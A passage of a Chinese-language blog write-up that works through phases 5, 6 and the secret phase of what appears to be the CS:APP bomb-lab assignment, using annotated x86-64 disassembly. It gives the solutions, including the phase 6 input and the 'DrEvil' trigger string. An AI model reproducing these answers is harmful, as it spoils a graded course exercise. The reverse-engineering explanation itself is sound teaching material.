<h2 id="2-5-phase-5"><a href="#2-5-phase-5" class="headerlink" title="2.5 phase 5"></a>2.5 phase 5</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000401062</span> &lt;phase_5&gt;:</span><br><span class="line">  <span class="number">401062</span>:	<span class="number">53</span>                   	push   %rbx</span><br><span class="line">  <span class="number">401063</span>:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">20</span>          	sub    $<span class="number">0x20</span>,%rsp  <span class="comment">// stack frame depth 0x20 byte</span></span><br><span class="line">  <span class="number">401067</span>:	<span class="number">48</span> <span class="number">89</span> fb             	mov    %rdi,%rbx  <span class="comment">// A parameter load in, string address</span></span><br><span class="line">  <span class="number">40106</span>a:	<span class="number">64</span> <span class="number">48</span> <span class="number">8b</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span> 	mov    %fs:<span class="number">0x28</span>,%rax  <span class="comment">// canary of stack;</span></span><br><span class="line">  <span class="number">401071</span>:	<span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  <span class="number">401073</span>:	<span class="number">48</span> <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">18</span>       	mov    %rax,<span class="number">0x18</span>(%rsp)  <span class="comment">// canary store.</span></span><br><span class="line">  <span class="number">401078</span>:	<span class="number">31</span> c0                	<span class="keyword">xor</span>    %eax,%eax</span><br><span class="line">  <span class="number">40107</span>a:	e8 <span class="number">9</span>c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40131b</span> &lt;string_length&gt; <span class="comment">// string address is %rbx</span></span><br><span class="line">  <span class="number">40107f</span>:	<span class="number">83</span> f8 <span class="number">06</span>             	cmp    $<span class="number">0x6</span>,%eax  <span class="comment">// find string length must be 6;</span></span><br><span class="line">  <span class="number">401082</span>:	<span class="number">74</span> <span class="number">4</span>e                	je     <span class="number">4010</span>d2 &lt;phase_5+<span class="number">0x70</span>&gt;</span><br><span class="line">  <span class="number">401084</span>:	e8 b1 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">401089</span>:	eb <span class="number">47</span>                	jmp    <span class="number">4010</span>d2 &lt;phase_5+<span class="number">0x70</span>&gt;</span><br><span class="line">  <span class="number">40108b</span>:	<span class="number">0f</span> b6 <span class="number">0</span>c <span class="number">03</span>          	movzbl (%rbx,%rax,<span class="number">1</span>),%ecx  <span class="comment">// get single character</span></span><br><span class="line">  <span class="number">40108f</span>:	<span class="number">88</span> <span class="number">0</span>c <span class="number">24</span>             	mov    %cl,(%rsp)</span><br><span class="line">  <span class="number">401092</span>:	<span class="number">48</span> <span class="number">8b</span> <span class="number">14</span> <span class="number">24</span>          	mov    (%rsp),%rdx <span class="comment">// move single character to rdx</span></span><br><span class="line">  <span class="number">401096</span>:	<span class="number">83</span> e2 <span class="number">0f</span>             	<span class="keyword">and</span>    $<span class="number">0xf</span>,%edx <span class="comment">// get lower-bits of %rdx</span></span><br><span class="line">  <span class="number">401099</span>:	<span class="number">0f</span> b6 <span class="number">92</span> b0 <span class="number">24</span> <span class="number">40</span> <span class="number">00</span> 	movzbl <span class="number">0x4024b0</span>(%rdx),%edx</span><br><span class="line">  <span class="number">4010</span>a0:	<span class="number">88</span> <span class="number">54</span> <span class="number">04</span> <span class="number">10</span>          	mov    %dl,<span class="number">0x10</span>(%rsp,%rax,<span class="number">1</span>)</span><br><span class="line">  <span class="number">4010</span>a4:	<span class="number">48</span> <span class="number">83</span> c0 <span class="number">01</span>          	add    $<span class="number">0x1</span>,%rax</span><br><span class="line">  <span class="number">4010</span>a8:	<span class="number">48</span> <span class="number">83</span> f8 <span class="number">06</span>          	cmp    $<span class="number">0x6</span>,%rax <span class="comment">// loop 6 times.</span></span><br><span class="line">  <span class="number">4010</span>ac:	<span class="number">75</span> dd                	jne    <span class="number">40108b</span> &lt;phase_5+<span class="number">0x29</span>&gt;</span><br><span class="line">  <span class="number">4010</span>ae:	c6 <span class="number">44</span> <span class="number">24</span> <span class="number">16</span> <span class="number">00</span>       	movb   $<span class="number">0x0</span>,<span class="number">0x16</span>(%rsp) <span class="comment">// last &#x27;\0&#x27; in string.</span></span><br><span class="line">  <span class="number">4010b</span>3:	be <span class="number">5</span>e <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x40245e</span>,%esi <span class="comment">// compare string %esi and %rdi</span></span><br><span class="line">  <span class="number">4010b</span>8:	<span class="number">48</span> <span class="number">8</span>d <span class="number">7</span>c <span class="number">24</span> <span class="number">10</span>       	lea    <span class="number">0x10</span>(%rsp),%rdi <span class="comment">// compare string %esi and %rdi</span></span><br><span class="line">  <span class="number">4010b</span>d:	e8 <span class="number">76</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">401338</span> &lt;strings_not_equal&gt;</span><br><span class="line">  <span class="number">4010</span>c2:	<span class="number">85</span> c0                	test   %eax,%eax</span><br><span class="line">  <span class="number">4010</span>c4:	<span class="number">74</span> <span class="number">13</span>                	je     <span class="number">4010</span>d9 &lt;phase_5+<span class="number">0x77</span>&gt;</span><br><span class="line">  <span class="number">4010</span>c6:	e8 <span class="number">6f</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">4010</span>cb:	<span class="number">0f</span> <span class="number">1f</span> <span class="number">44</span> <span class="number">00</span> <span class="number">00</span>       	nopl   <span class="number">0x0</span>(%rax,%rax,<span class="number">1</span>)</span><br><span class="line">  <span class="number">4010</span>d0:	eb <span class="number">07</span>                	jmp    <span class="number">4010</span>d9 &lt;phase_5+<span class="number">0x77</span>&gt;</span><br><span class="line">  <span class="number">4010</span>d2:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax  <span class="comment">// set ans = 0;</span></span><br><span class="line">  <span class="number">4010</span>d7:	eb b2                	jmp    <span class="number">40108b</span> &lt;phase_5+<span class="number">0x29</span>&gt;</span><br><span class="line">  <span class="number">4010</span>d9:	<span class="number">48</span> <span class="number">8b</span> <span class="number">44</span> <span class="number">24</span> <span class="number">18</span>       	mov    <span class="number">0x18</span>(%rsp),%rax</span><br><span class="line">  <span class="number">4010</span>de:	<span class="number">64</span> <span class="number">48</span> <span class="number">33</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span> 	<span class="keyword">xor</span>    %fs:<span class="number">0x28</span>,%rax</span><br><span class="line">  <span class="number">4010e5</span>:	<span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  <span class="number">4010e7</span>:	<span class="number">74</span> <span class="number">05</span>                	je     <span class="number">4010</span>ee &lt;phase_5+<span class="number">0x8c</span>&gt;</span><br><span class="line">  <span class="number">4010e9</span>:	e8 <span class="number">42</span> fa ff ff       	callq  <span class="number">400b</span>30 &lt;__stack_chk_fail@plt&gt;  <span class="comment">// stack canary</span></span><br><span class="line">  <span class="number">4010</span>ee:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">20</span>          	add    $<span class="number">0x20</span>,%rsp</span><br><span class="line">  <span class="number">4010f</span>2:	<span class="number">5b</span>                   	pop    %rbx</span><br><span class="line">  <span class="number">4010f</span>3:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>gdb 打印 <code>0x4024b0</code> 处的字符串，得到 <code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code> 打印位于 <code>0x40245e</code> 处的字符串，得到 <code>&quot;flyers&quot;</code> 。显然最后的结果需要与这个作比较。如代码中的注释显示，这里做的操作就是读取我输入的字符串的每个字符，然后把这个字符的后4个bit取出来作为 offsite 在 <code>0x4024b0</code> 处的字符串中找到相应的字符。</p>
<h2 id="2-6-phase-6-loop-amp-linked-list"><a href="#2-6-phase-6-loop-amp-linked-list" class="headerlink" title="2.6 phase 6 loop &amp; linked-list"></a>2.6 phase 6 loop &amp; linked-list</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000004010f</span>4 &lt;phase_6&gt;:</span><br><span class="line">  <span class="number">4010f</span>4:	<span class="number">41</span> <span class="number">56</span>                	push   %r14</span><br><span class="line">  <span class="number">4010f</span>6:	<span class="number">41</span> <span class="number">55</span>                	push   %r13</span><br><span class="line">  <span class="number">4010f</span>8:	<span class="number">41</span> <span class="number">54</span>                	push   %r12</span><br><span class="line">  <span class="number">4010f</span>a:	<span class="number">55</span>                   	push   %rbp</span><br><span class="line">  <span class="number">4010f</span>b:	<span class="number">53</span>                   	push   %rbx</span><br><span class="line">  <span class="number">4010f</span>c:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">50</span>          	sub    $<span class="number">0x50</span>,%rsp <span class="comment">// stack init</span></span><br><span class="line">  <span class="number">401100</span>:	<span class="number">49</span> <span class="number">89</span> e5             	mov    %rsp,%r13</span><br><span class="line">  <span class="number">401103</span>:	<span class="number">48</span> <span class="number">89</span> e6             	mov    %rsp,%rsi</span><br><span class="line">  <span class="number">401106</span>:	e8 <span class="number">51</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40145</span>c &lt;read_six_numbers&gt; <span class="comment">// read six value</span></span><br><span class="line">  <span class="number">40110b</span>:	<span class="number">49</span> <span class="number">89</span> e6             	mov    %rsp,%r14</span><br><span class="line">  <span class="number">40110</span>e:	<span class="number">41</span> bc <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	mov    $<span class="number">0x0</span>,%r12d</span><br><span class="line">  <span class="number">401114</span>:	<span class="number">4</span>c <span class="number">89</span> ed             	mov    %r13,%rbp</span><br><span class="line">  <span class="number">401117</span>:	<span class="number">41</span> <span class="number">8b</span> <span class="number">45</span> <span class="number">00</span>          	mov    <span class="number">0x0</span>(%r13),%eax</span><br><span class="line">  <span class="number">40111b</span>:	<span class="number">83</span> e8 <span class="number">01</span>             	sub    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">40111</span>e:	<span class="number">83</span> f8 <span class="number">05</span>             	cmp    $<span class="number">0x5</span>,%eax</span><br><span class="line">  <span class="number">401121</span>:	<span class="number">76</span> <span class="number">05</span>                	jbe    <span class="number">401128</span> &lt;phase_6+<span class="number">0x34</span>&gt;</span><br><span class="line">  <span class="number">401123</span>:	e8 <span class="number">12</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">401128</span>:	<span class="number">41</span> <span class="number">83</span> c4 <span class="number">01</span>          	add    $<span class="number">0x1</span>,%r12d</span><br><span class="line">  <span class="number">40112</span>c:	<span class="number">41</span> <span class="number">83</span> fc <span class="number">06</span>          	cmp    $<span class="number">0x6</span>,%r12d</span><br><span class="line">  <span class="number">401130</span>:	<span class="number">74</span> <span class="number">21</span>                	je     <span class="number">401153</span> &lt;phase_6+<span class="number">0x5f</span>&gt;</span><br><span class="line">  <span class="number">401132</span>:	<span class="number">44</span> <span class="number">89</span> e3             	mov    %r12d,%ebx</span><br><span class="line">  <span class="number">401135</span>:	<span class="number">48</span> <span class="number">63</span> c3             	movslq %ebx,%rax</span><br><span class="line">  <span class="number">401138</span>:	<span class="number">8b</span> <span class="number">04</span> <span class="number">84</span>             	mov    (%rsp,%rax,<span class="number">4</span>),%eax</span><br><span class="line">  <span class="number">40113b</span>:	<span class="number">39</span> <span class="number">45</span> <span class="number">00</span>             	cmp    %eax,<span class="number">0x0</span>(%rbp)</span><br><span class="line">  <span class="number">40113</span>e:	<span class="number">75</span> <span class="number">05</span>                	jne    <span class="number">401145</span> &lt;phase_6+<span class="number">0x51</span>&gt;</span><br><span class="line">  <span class="number">401140</span>:	e8 f5 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">401145</span>:	<span class="number">83</span> c3 <span class="number">01</span>             	add    $<span class="number">0x1</span>,%ebx</span><br><span class="line">  <span class="number">401148</span>:	<span class="number">83</span> fb <span class="number">05</span>             	cmp    $<span class="number">0x5</span>,%ebx</span><br><span class="line">  <span class="number">40114b</span>:	<span class="number">7</span>e e8                	jle    <span class="number">401135</span> &lt;phase_6+<span class="number">0x41</span>&gt;</span><br><span class="line">  <span class="number">40114</span>d:	<span class="number">49</span> <span class="number">83</span> c5 <span class="number">04</span>          	add    $<span class="number">0x4</span>,%r13</span><br><span class="line">  <span class="number">401151</span>:	eb c1                	jmp    <span class="number">401114</span> &lt;phase_6+<span class="number">0x20</span>&gt;</span><br><span class="line">  <span class="number">401153</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">74</span> <span class="number">24</span> <span class="number">18</span>       	lea    <span class="number">0x18</span>(%rsp),%rsi</span><br><span class="line">  <span class="number">401158</span>:	<span class="number">4</span>c <span class="number">89</span> f0             	mov    %r14,%rax</span><br><span class="line">  <span class="number">40115b</span>:	b9 <span class="number">07</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x7</span>,%ecx</span><br><span class="line">  <span class="number">401160</span>:	<span class="number">89</span> ca                	mov    %ecx,%edx</span><br><span class="line">  <span class="number">401162</span>:	<span class="number">2b</span> <span class="number">10</span>                	sub    (%rax),%edx</span><br><span class="line">  <span class="number">401164</span>:	<span class="number">89</span> <span class="number">10</span>                	mov    %edx,(%rax)</span><br><span class="line">  <span class="number">401166</span>:	<span class="number">48</span> <span class="number">83</span> c0 <span class="number">04</span>          	add    $<span class="number">0x4</span>,%rax</span><br><span class="line">  <span class="number">40116</span>a:	<span class="number">48</span> <span class="number">39</span> f0             	cmp    %rsi,%rax</span><br><span class="line">  <span class="number">40116</span>d:	<span class="number">75</span> f1                	jne    <span class="number">401160</span> &lt;phase_6+<span class="number">0x6c</span>&gt;</span><br><span class="line">  <span class="number">40116f</span>:	be <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%esi</span><br><span class="line">  <span class="number">401174</span>:	eb <span class="number">21</span>                	jmp    <span class="number">401197</span> &lt;phase_6+<span class="number">0xa3</span>&gt;</span><br><span class="line">  <span class="number">401176</span>:	<span class="number">48</span> <span class="number">8b</span> <span class="number">52</span> <span class="number">08</span>          	mov    <span class="number">0x8</span>(%rdx),%rdx</span><br><span class="line">  <span class="number">40117</span>a:	<span class="number">83</span> c0 <span class="number">01</span>             	add    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">40117</span>d:	<span class="number">39</span> c8                	cmp    %ecx,%eax</span><br><span class="line">  <span class="number">40117f</span>:	<span class="number">75</span> f5                	jne    <span class="number">401176</span> &lt;phase_6+<span class="number">0x82</span>&gt;</span><br><span class="line">  <span class="number">401181</span>:	eb <span class="number">05</span>                	jmp    <span class="number">401188</span> &lt;phase_6+<span class="number">0x94</span>&gt;</span><br><span class="line">  <span class="number">401183</span>:	ba d0 <span class="number">32</span> <span class="number">60</span> <span class="number">00</span>       	mov    $<span class="number">0x6032d0</span>,%edx</span><br><span class="line">  <span class="number">401188</span>:	<span class="number">48</span> <span class="number">89</span> <span class="number">54</span> <span class="number">74</span> <span class="number">20</span>       	mov    %rdx,<span class="number">0x20</span>(%rsp,%rsi,<span class="number">2</span>)</span><br><span class="line">  <span class="number">40118</span>d:	<span class="number">48</span> <span class="number">83</span> c6 <span class="number">04</span>          	add    $<span class="number">0x4</span>,%rsi</span><br><span class="line">  <span class="number">401191</span>:	<span class="number">48</span> <span class="number">83</span> fe <span class="number">18</span>          	cmp    $<span class="number">0x18</span>,%rsi</span><br><span class="line">  <span class="number">401195</span>:	<span class="number">74</span> <span class="number">14</span>                	je     <span class="number">4011</span>ab &lt;phase_6+<span class="number">0xb7</span>&gt;</span><br><span class="line">  <span class="number">401197</span>:	<span class="number">8b</span> <span class="number">0</span>c <span class="number">34</span>             	mov    (%rsp,%rsi,<span class="number">1</span>),%ecx</span><br><span class="line">  <span class="number">40119</span>a:	<span class="number">83</span> f9 <span class="number">01</span>             	cmp    $<span class="number">0x1</span>,%ecx</span><br><span class="line">  <span class="number">40119</span>d:	<span class="number">7</span>e e4                	jle    <span class="number">401183</span> &lt;phase_6+<span class="number">0x8f</span>&gt;</span><br><span class="line">  <span class="number">40119f</span>:	b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">4011</span>a4:	ba d0 <span class="number">32</span> <span class="number">60</span> <span class="number">00</span>       	mov    $<span class="number">0x6032d0</span>,%edx</span><br><span class="line">  <span class="number">4011</span>a9:	eb cb                	jmp    <span class="number">401176</span> &lt;phase_6+<span class="number">0x82</span>&gt;</span><br><span class="line">  <span class="number">4011</span>ab:	<span class="number">48</span> <span class="number">8b</span> <span class="number">5</span>c <span class="number">24</span> <span class="number">20</span>       	mov    <span class="number">0x20</span>(%rsp),%rbx</span><br><span class="line">  <span class="number">4011b</span>0:	<span class="number">48</span> <span class="number">8</span>d <span class="number">44</span> <span class="number">24</span> <span class="number">28</span>       	lea    <span class="number">0x28</span>(%rsp),%rax</span><br><span class="line">  <span class="number">4011b</span>5:	<span class="number">48</span> <span class="number">8</span>d <span class="number">74</span> <span class="number">24</span> <span class="number">50</span>       	lea    <span class="number">0x50</span>(%rsp),%rsi</span><br><span class="line">  <span class="number">4011b</span>a:	<span class="number">48</span> <span class="number">89</span> d9             	mov    %rbx,%rcx</span><br><span class="line">  <span class="number">4011b</span>d:	<span class="number">48</span> <span class="number">8b</span> <span class="number">10</span>             	mov    (%rax),%rdx</span><br><span class="line">  <span class="number">4011</span>c0:	<span class="number">48</span> <span class="number">89</span> <span class="number">51</span> <span class="number">08</span>          	mov    %rdx,<span class="number">0x8</span>(%rcx)</span><br><span class="line">  <span class="number">4011</span>c4:	<span class="number">48</span> <span class="number">83</span> c0 <span class="number">08</span>          	add    $<span class="number">0x8</span>,%rax</span><br><span class="line">  <span class="number">4011</span>c8:	<span class="number">48</span> <span class="number">39</span> f0             	cmp    %rsi,%rax</span><br><span class="line">  <span class="number">4011</span>cb:	<span class="number">74</span> <span class="number">05</span>                	je     <span class="number">4011</span>d2 &lt;phase_6+<span class="number">0xde</span>&gt;</span><br><span class="line">  <span class="number">4011</span>cd:	<span class="number">48</span> <span class="number">89</span> d1             	mov    %rdx,%rcx</span><br><span class="line">  <span class="number">4011</span>d0:	eb eb                	jmp    <span class="number">4011b</span>d &lt;phase_6+<span class="number">0xc9</span>&gt;</span><br><span class="line">  <span class="number">4011</span>d2:	<span class="number">48</span> c7 <span class="number">42</span> <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	movq   $<span class="number">0x0</span>,<span class="number">0x8</span>(%rdx)</span><br><span class="line">  <span class="number">4011</span>d9:	<span class="number">00</span> </span><br><span class="line">  <span class="number">4011</span>da:	bd <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x5</span>,%ebp</span><br><span class="line">  <span class="number">4011</span>df:	<span class="number">48</span> <span class="number">8b</span> <span class="number">43</span> <span class="number">08</span>          	mov    <span class="number">0x8</span>(%rbx),%rax</span><br><span class="line">  <span class="number">4011e3</span>:	<span class="number">8b</span> <span class="number">00</span>                	mov    (%rax),%eax</span><br><span class="line">  <span class="number">4011e5</span>:	<span class="number">39</span> <span class="number">03</span>                	cmp    %eax,(%rbx)</span><br><span class="line">  <span class="number">4011e7</span>:	<span class="number">7</span>d <span class="number">05</span>                	jge    <span class="number">4011</span>ee &lt;phase_6+<span class="number">0xfa</span>&gt;</span><br><span class="line">  <span class="number">4011e9</span>:	e8 <span class="number">4</span>c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">4011</span>ee:	<span class="number">48</span> <span class="number">8b</span> <span class="number">5b</span> <span class="number">08</span>          	mov    <span class="number">0x8</span>(%rbx),%rbx</span><br><span class="line">  <span class="number">4011f</span>2:	<span class="number">83</span> ed <span class="number">01</span>             	sub    $<span class="number">0x1</span>,%ebp</span><br><span class="line">  <span class="number">4011f</span>5:	<span class="number">75</span> e8                	jne    <span class="number">4011</span>df &lt;phase_6+<span class="number">0xeb</span>&gt;</span><br><span class="line">  <span class="number">4011f</span>7:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">50</span>          	add    $<span class="number">0x50</span>,%rsp</span><br><span class="line">  <span class="number">4011f</span>b:	<span class="number">5b</span>                   	pop    %rbx</span><br><span class="line">  <span class="number">4011f</span>c:	<span class="number">5</span>d                   	pop    %rbp</span><br><span class="line">  <span class="number">4011f</span>d:	<span class="number">41</span> <span class="number">5</span>c                	pop    %r12</span><br><span class="line">  <span class="number">4011f</span>f:	<span class="number">41</span> <span class="number">5</span>d                	pop    %r13</span><br><span class="line">  <span class="number">401201</span>:	<span class="number">41</span> <span class="number">5</span>e                	pop    %r14</span><br><span class="line">  <span class="number">401203</span>:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>首先读入了6个数字，分别放入了<code>%rsp+0x0、%rsp+0x4、%rsp+0x8、%rsp+0xc、%rsp+0x10、%rsp+0x14</code> 。然后是大循环内嵌小循环，大循环中部分的作用是确定每个数必须&lt;=6；小循环的作用是确定第<code>i</code>个数不和第<code>i+1</code><del>第<code>6</code>个数相同（也就是输入的所有数字不能有相同的）。然后，再是一个大循环，主要作用就是令<code>a[i]=7-a[i],i=1,2,3,4,5,6</code>，就是将存于栈中的数（也是你输入的数）进行对7求补并保存回原位置。接下来又是一个大循环套一个小循环，主要作用是访问一个链表，链表的首地址为<code>0x6032d0</code>，针对输入的第<code>i</code>个数，按照<code>a[i]</code>的值获取链表第<code>a[i]</code>个节点，并把节点首地址放入<code>%rsp+0x20+0x0</code></del>到<code>%rsp+0x20+0x28</code>刚好是6个节点。然后又是一个大循环，主要是说明 <code>%rsp+0x20+0x0</code> ~到<code>%rsp+0x20+0x28</code>存储的链表节点值必须是递减的。找到了各节点的值，我们就可以排序得到节点标号的排序，节点标号的排序恰恰是输入6个数字对7求补的值，然后再对7求补即可得到结果<code>4 3 2 1 6 5</code>。</p>
<h2 id="2-7-secret-phase"><a href="#2-7-secret-phase" class="headerlink" title="2.7 secret phase"></a>2.7 secret phase</h2><p>查看 phase_defused 的 assembly code</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000004015</span>c4 &lt;phase_defused&gt;:</span><br><span class="line">  <span class="number">4015</span>c4:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">78</span>          	sub    $<span class="number">0x78</span>,%rsp</span><br><span class="line">  <span class="number">4015</span>c8:	<span class="number">64</span> <span class="number">48</span> <span class="number">8b</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span> 	mov    %fs:<span class="number">0x28</span>,%rax</span><br><span class="line">  <span class="number">4015</span>cf:	<span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  <span class="number">4015</span>d1:	<span class="number">48</span> <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">68</span>       	mov    %rax,<span class="number">0x68</span>(%rsp)</span><br><span class="line">  <span class="number">4015</span>d6:	<span class="number">31</span> c0                	<span class="keyword">xor</span>    %eax,%eax</span><br><span class="line">  <span class="number">4015</span>d8:	<span class="number">83</span> <span class="number">3</span>d <span class="number">81</span> <span class="number">21</span> <span class="number">20</span> <span class="number">00</span> <span class="number">06</span> 	cmpl   $<span class="number">0x6</span>,<span class="number">0x202181</span>(%rip)        # <span class="number">603760</span> &lt;num_input_strings&gt;</span><br><span class="line">  <span class="number">4015</span>df:	<span class="number">75</span> <span class="number">5</span>e                	jne    <span class="number">40163f</span> &lt;phase_defused+<span class="number">0x7b</span>&gt;</span><br><span class="line">  <span class="number">4015e1</span>:	<span class="number">4</span>c <span class="number">8</span>d <span class="number">44</span> <span class="number">24</span> <span class="number">10</span>       	lea    <span class="number">0x10</span>(%rsp),%r8</span><br><span class="line">  <span class="number">4015e6</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">4</span>c <span class="number">24</span> <span class="number">0</span>c       	lea    <span class="number">0xc</span>(%rsp),%rcx</span><br><span class="line">  <span class="number">4015</span>eb:	<span class="number">48</span> <span class="number">8</span>d <span class="number">54</span> <span class="number">24</span> <span class="number">08</span>       	lea    <span class="number">0x8</span>(%rsp),%rdx</span><br><span class="line">  <span class="number">4015f</span>0:	be <span class="number">19</span> <span class="number">26</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x402619</span>,%esi</span><br><span class="line">  <span class="number">4015f</span>5:	bf <span class="number">70</span> <span class="number">38</span> <span class="number">60</span> <span class="number">00</span>       	mov    $<span class="number">0x603870</span>,%edi</span><br><span class="line">  <span class="number">4015f</span>a:	e8 f1 f5 ff ff       	callq  <span class="number">400b</span>f0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  <span class="number">4015f</span>f:	<span class="number">83</span> f8 <span class="number">03</span>             	cmp    $<span class="number">0x3</span>,%eax</span><br><span class="line">  <span class="number">401602</span>:	<span class="number">75</span> <span class="number">31</span>                	jne    <span class="number">401635</span> &lt;phase_defused+<span class="number">0x71</span>&gt;</span><br><span class="line">  <span class="number">401604</span>:	be <span class="number">22</span> <span class="number">26</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x402622</span>,%esi</span><br><span class="line">  <span class="number">401609</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">7</span>c <span class="number">24</span> <span class="number">10</span>       	lea    <span class="number">0x10</span>(%rsp),%rdi</span><br><span class="line">  <span class="number">40160</span>e:	e8 <span class="number">25</span> fd ff ff       	callq  <span class="number">401338</span> &lt;strings_not_equal&gt;</span><br><span class="line">  <span class="number">401613</span>:	<span class="number">85</span> c0                	test   %eax,%eax</span><br><span class="line">  <span class="number">401615</span>:	<span class="number">75</span> <span class="number">1</span>e                	jne    <span class="number">401635</span> &lt;phase_defused+<span class="number">0x71</span>&gt;</span><br><span class="line">  <span class="number">401617</span>:	bf f8 <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x4024f8</span>,%edi</span><br><span class="line">  <span class="number">40161</span>c:	e8 ef f4 ff ff       	callq  <span class="number">400b</span>10 &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">  <span class="number">401621</span>:	bf <span class="number">20</span> <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x402520</span>,%edi</span><br><span class="line">  <span class="number">401626</span>:	e8 e5 f4 ff ff       	callq  <span class="number">400b</span>10 &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">  <span class="number">40162b</span>:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">401630</span>:	e8 <span class="number">0</span>d fc ff ff       	callq  <span class="number">401242</span> &lt;secret_phase&gt;</span><br><span class="line">  <span class="number">401635</span>:	bf <span class="number">58</span> <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x402558</span>,%edi</span><br><span class="line">  <span class="number">40163</span>a:	e8 d1 f4 ff ff       	callq  <span class="number">400b</span>10 &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">  <span class="number">40163f</span>:	<span class="number">48</span> <span class="number">8b</span> <span class="number">44</span> <span class="number">24</span> <span class="number">68</span>       	mov    <span class="number">0x68</span>(%rsp),%rax</span><br><span class="line">  <span class="number">401644</span>:	<span class="number">64</span> <span class="number">48</span> <span class="number">33</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span> 	<span class="keyword">xor</span>    %fs:<span class="number">0x28</span>,%rax</span><br><span class="line">  <span class="number">40164b</span>:	<span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  <span class="number">40164</span>d:	<span class="number">74</span> <span class="number">05</span>                	je     <span class="number">401654</span> &lt;phase_defused+<span class="number">0x90</span>&gt;</span><br><span class="line">  <span class="number">40164f</span>:	e8 dc f4 ff ff       	callq  <span class="number">400b</span>30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  <span class="number">401654</span>:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">78</span>          	add    $<span class="number">0x78</span>,%rsp</span><br><span class="line">  <span class="number">401658</span>:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>可以知道，第四关和第五关前两个都是输入整型，测试一下发现必须要在第四关（第五关不必要）输入的两个整形后面输入”DrEvil”才能成功触发。在gdb中测试，发现  <code>0x402622:”DrEvil”</code> 。</p>
